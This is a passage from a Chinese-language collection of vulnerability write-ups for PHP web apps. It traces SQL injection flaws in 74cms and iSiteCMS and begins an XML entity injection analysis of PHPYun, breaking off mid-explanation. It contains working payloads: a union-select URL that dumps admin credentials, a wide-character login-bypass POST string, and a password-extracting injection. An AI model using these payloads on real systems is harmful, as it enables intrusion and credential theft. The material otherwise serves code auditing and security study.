整套程序过滤的还是比较全面的 不过所有版本都是 GBK 编码是
他的硬伤 但是基本上字符串入库的时候作者都使用了 iconv 来把提交
过来的数据编码转换成 utf8
所以利用宽字符注入就没办法了 但是过滤完善仅限 3.2 版本之前
最新的 3.2 版本 plus 目录多了几个文件 不知道是不是换了程序员了...
先上两个白痴注入吧~
File: \plus\ajax_officebuilding.php
line:16
- 38 -
if($act == 'alphabet')
{
$alphabet=trim($_GET['x']);
if (!empty($alphabet))
{
$result = $db->query("select * from ".table('category')." where
c_alias='QS_officebuilding' AND c_index='{$alphabet}' ");
while($row = $db->fetch_array($result))
{
if ($listtype=="li")
{
$htm.="
{$row['c_name']}";
}
else
{
$htm.="
{$row['c_name']}{$row['stat_jobs']}";
}
}
if (empty($htm))
{
$htm="没有找到首字母为：{$alphabet}
的写字楼！";
}
$htm.="";
exit($htm);
}
}
$_GET['x']获取的值给$alphabet, 而$alphabet 直接插入到了 SQL 查询语句中。
所以这里造成了注入
- 39 -
exp：
plus/ajax_officebuilding.php?act=alphabet&x=11%d5'%20union%20select%201,2,3,c
oncat(0x3C2F613E20),5,6,7,concat(0x3C623E5E5F5E203C2F623E,admin_nam
e,0x3A,pwd,0x3C623E205E5F5E3C2F623E),9%20from%20qs_admin%23
注入也是白搭 因为 hash 解不出来，经过多次加密的 试了十几个一个
都没解出来....
File:\admin\admin_login.php (42 行)
elseif($act == 'do_login')
{
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");
$admin_name = isset($_POST['admin_name']) ?
trim($_POST['admin_name']) : ''; //没过滤~~~
$admin_pwd = isset($_POST['admin_pwd']) ?
- 40 -
trim($_POST['admin_pwd']) : '';
$postcaptcha = isset($_POST['postcaptcha']) ? $_POST['postcaptcha'] :
'';
$remember = isset($_POST['rememberme']) ?
intval($_POST['rememberme']) : 0;
if($admin_name == '')
{
header("Location:?act=login&err=".urlencode('用户名不能为空'));
exit();
}
elseif($admin_pwd == '')
{
header("Location:?act=login&err=".urlencode('密码不能为空'));
exit();
}
$captcha=get_cache('captcha');
if(empty($postcaptcha) && $captcha['verify_adminlogin']=='1')
{
header("Location:?act=login&err=".urlencode('验证码不能为空
'));
exit();
}
if ($captcha['verify_adminlogin']=='1' &&
strcasecmp($_SESSION['imageCaptcha_content'],$postcaptcha)!=0)
{
write_log("验证码填写错误",$admin_name,2);
header("Location:?act=login&err=".urlencode('验证码填写错误
'));
exit();
}
elseif(check_admin($admin_name,$admin_pwd)) //关键函数
直接带
入进去了
{
- 41 -
update_admin_info($admin_name);
write_log("成功登录",$admin_name);
if($remember == 1)
{
$admininfo=get_admin_one($admin_name);
setcookie('Qishi[admin_id]', $_SESSION['admin_id'],
time()+86400, $QS_cookiepath, $QS_cookiedomain);
setcookie('Qishi[admin_name]', $admin_name,
time()+86400, $QS_cookiepath, $QS_cookiedomain);
setcookie('Qishi[admin_pwd]',
md5($admin_name.$admininfo['pwd'].$admininfo['pwd_hash'].$QS_pwdhash),
time()+86400, $QS_cookiepath, $QS_cookiedomain);
}
}
else
{
write_log("用户名或密码错误",$admin_name,2);
header("Location:?act=login&err=".urlencode('用户名或密码错
误'));
exit();
}
header("Location: admin_index.php");
}
$admin_name 经过了 check_admin 函数处理。
继续追下 check_admin 函数:
\admin\include\admin_common.fun.php (197 行)
function check_admin($name,$pwd)
{
global $db,$QS_pwdhash;
$admin=get_admin_one($name); //先把程序 name 带入了这个函数进行了
一次查询
- 42 -
$md5_pwd=md5($pwd.$admin['pwd_hash'].$QS_pwdhash);
$row = $db->getone("SELECT COUNT(*) AS num FROM
".table('admin')." WHERE admin_name='$name' and pwd ='".$md5_pwd."' ");
//继续查询
if($row['num'] > 0){
return true;
}else{
return false;
}
}
再看看 get_admin_one 函数:
\admin\include\admin_common.fun.php (237 行)
function get_admin_one($username){
global $db;
$sql = "select * from ".table('admin')." where admin_name =
'".$username."' LIMIT 1"; //同样直接查询了
return $db->getone($sql);
}
get_admin_one 函数和 check_admin 函数都是直接就带入查询了
除了 POST 开头被 addslashes 函数过滤过一次 但是在宽字符面前这些都
是浮云~~
- 43 -
直接向 admin_login.php?act=do_login 构造以下 POST 语句就能
直接进后台了~~ 当然前提你得有后台路径
admin_name=fuckyou%d5' or 1=1%23&admin_pwd=1
iSiteCMS 几处注射漏洞
作者：lxj616
File:/isite/components/messages/messages.fe.php line:103
if($form->status == TFORM_STATUS_GETED_VALID){
//这个是站内短信的写信息表单的处理
$arr = $form->getValues();
- 44 -
//直接获取表单中信息
$tos = explode(',',trim($arr['to']));
//只是分割，不是过滤
$noExistsMenber = array();
$toMenbers = array();
foreach ($tos as $menber){
$i =$this->DBE->getOne("select `id` from #__user where
`name`='$menber'");
//一直到上面这一句都没有过滤，直接带入数据库查询了，之所以会这么写可能
的原因是开发人员误以为`name`='$menber'的引号可以起到保护作用（其他的 int
变量都通过了 inval，而这个是 string 可以输入单引号）
if(is_null($i) or empty($i)){
$noExistsMenber[] = $menber;
//id 只要有返回就可以继续
}else{
$m['name'] = $menber;
$m['id']
= $i;
$toMenbers[] = $m;
}
}
if(!empty($noExistsMenber)){
addGlobalNotice("以下用户不存在：".implode(',',$noExistsMenber));
}else{
$msg['tos'] = $arr['to'];
$msg['subject'] = $arr['subject'];
$msg['content'] = $arr['content'];
//进入信息发送的模块了，实际上之前就已经引发注射了，但是攻击时需要读
sendMessage 代码
$mMessage->sendMessage($toMenbers,$msg);
$this->flash('成功','发送成功',bu(1,'messages','inbox'));
}
这个就是代码里的表单显示
- 45 -
上面同理：
/isite/components/links/links.be.php line:64
if($form->status == TFORM_STATUS_GETED_VALID){
$newCat = $form->getValues();
if($id==0){
//create category
//check name
$name = $newCat['name'];
$nameUsed =
$this->DBE->getOne("select count(*) from #__link_category where
`name`='$name'");
if($nameUsed){
$form->status =
TFORM_STATUS_GETED;
下面是对于攻击方式的分析
注射肯定是有了，但是这里有一点点别扭的地方，就是
$tos = explode(',',trim($arr['to']));
- 46 -
这句话把逗号给干掉了，给注射添加了小小难度
继续分析代码：
File:/isite/components/messages/models/message.php 整个 php
function sendMessage($to,$message,$type=null,$newCall=1){
//刚才检测完用户是否存在后，调用这个函数
if(isset($to['name']) or is_string($to)){
if(is_string($to)){
$to['name'] = $to;
}
if(!isset($to['id'])){
//还记得 id 吗，是之前被注射 SQL 的返回，理论上正常应该是目标用户的 id
$to['id'] = $this->_db->getOne("select `id` from #__user where
`name`='$to[name]'");
}
//又 SELECT 一遍，不过 name 还是注射时的 name，这一句也被注射了
global $gUser;
$message['to'] = $to['name'];
$message['to_id'] = $to['id'];
$message['from'] = $gUser->name;
$message['from_id'] = $gUser->id;
$message['create_time'] = TIME_STAMP;
$message['type'] = $type;
$this->insert($message);
//看到下一句，终于长舒一口气，注射可以有回显了！to_id 就是我们的语句执行
结果，而它会报错给我们看的！
$this->_db->execute("update #__user set
`new_msg_count`=`new_msg_count`+1 where `id`=$message[to_id]");
if($newCall>0){
$message['to'] = '';
$message['to_id'] = 0;
$this->insert($message);
$newCall--;
- 47 -
}
}else if(is_array($to)){
foreach ($to as $sto){
$this->sendMessage($sto,$message,null,$newCall);
}
}
}
利用：
注册一下，在会员中心-站内短信-发信息 里那个 link 模块里的注射没
找到表单在什么地方
注射+回显方法 ：
test' and 1=2 union select password from flexi_user where
id=1#
- 48 -
PHPYun XML 实体注入
作者：未知
File：/weixin/model/index.clss.php
Code: 13
class index_controller extends common
{
public $MsgType;
public function index_action()
{
if($_GET["echostr"])
{
$this->valid();
}else{
//if(!$this->checkSignature()){echo "
非法来源地址！";exit();};
$postStr =
$GLOBALS["HTTP_RAW_POST_DATA"];
if (!empty($postStr))
{
- 49 -
$postObj =
simplexml_load_string($postStr, 'SimpleXMLElement',
LIBXML_NOCDATA);
$fromUsername =
$postObj->FromUserName;
$toUsername = $postObj->ToUserName;
$keyword = trim($postObj->Content);
$times = time();
$MsgType = $postObj->MsgType;
$topTpl = "
%s
";
$bottomStr =
"0";
if($MsgType=='event')
{
$MsgEvent = $postObj->Event;
if ($MsgEvent=='subscribe')
{
$centerStr =
"config['sy_webname'])."！\n 1：您可以
直接回复关键字如【销售】、【南京 销售】、【南京 销售 XX 公司】查找您想要
的职位\n 绑定您的账户体验更多精彩功能\n 感谢您的关注！]]>";
$this->MsgType =
'text';
}elseif ($MsgEvent=='CLICK')
- 50 -
{
$EventKey =
$postObj->EventKey;
if($EventKey=='myaccount'){
$centerStr = $this->bindUser($fromUsername);
}elseif($EventKey=='我的消息')
{
$centerStr = $this->myMsg($fromUsername);
}elseif($EventKey=='面试邀请')
{
$centerStr = $this->Audition($fromUsername);
}elseif($EventKey=='简历查看')
{
$centerStr = $this->lookResume($fromUsername);
}elseif($EventKey=='刷新简历')
{
$centerStr = $this->refResume($fromUsername);
}elseif($EventKey=='推荐职位')
{
$centerStr = $this->recJob();
}elseif($EventKey=='职位搜索'){
- 51 -
$centerStr = "";
$this->MsgType = 'text';
}
}
}elseif($MsgType=='text'){
if($keyword){
$centerStr =
$this->searchJob($keyword);
}
}
$topStr = sprintf($topTpl,
$fromUsername, $toUsername, $times, $this->MsgType);
echo $topStr.$centerStr.$bottomStr;
}
}
}
- 52 -
先来慢慢分析一下定义一个属性$MsgType,后面判断 echostr 是
否通过 GET 方式提交，如果是则调用 valid()方法
这里先不往下读，先跟进 valid()方法是做什么的：
Code:482
private function valid()
{
$echoStr = $_GET["echostr"];
if($this->checkSignature()){
echo $echoStr;
exit;
}
}
private function checkSignature()
{
- 53 -
$signature = $_GET["signature"];
$timestamp = $_GET["timestamp"];
$nonce = $_GET["nonce"];
$token = $this->config['wx_token'];
$tmpArr = array($token, $timestamp,
$nonce);
sort($tmpArr, SORT_STRING);
$tmpStr = implode( $tmpArr );
$tmpStr = sha1( $tmpStr );
if( $tmpStr == $signature
&&
$token!=''){
return true;
}else{
return false;
}
}
主要是检查签名，还有$token 是否不为空。 而这里的 wx_token
默认是为空的，所以这里有一项条件不成功，则反回 false。
所以这里就跟进完了，valid()这个方法是用来检查签名的
然后继续往下：
$postStr = $GLOBALS["HTTP_RAW_POST_DATA"];
if (!empty($postStr))
{
$postObj =
simplexml_load_string($postStr, 'SimpleXMLElement',
LIBXML_NOCDATA);
$fromUsername =
$postObj->FromUserName;
$toUsername =
$postObj->ToUserName;
- 54 -
$keyword =
trim($postObj->Content);
$times = time();
$MsgType = $postObj->MsgType;
$topTpl = "
%s
";
$bottomStr =
"0";
$GLOBALS[“HTTP_RAW_POST_DATA”]
所以这里获取的 post 传给了变量,然后进行了判断$postStr 是否
不为空，如果不为空则调用 simplexml_load_string()方法，把 XML